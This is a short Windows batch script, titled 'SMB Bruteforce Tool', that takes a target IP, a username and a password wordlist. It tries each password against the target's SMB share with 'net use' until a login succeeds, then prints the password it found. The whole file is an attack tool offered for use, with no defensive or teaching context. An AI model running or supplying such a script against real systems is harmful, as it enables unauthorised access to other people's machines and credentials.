@echo off
title SMB Bruteforce Tool
color A
echo.
set /p ip="Enter Target IP: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
python color.py failure
pause
exit

:success
echo.
python color.py success %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT: %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success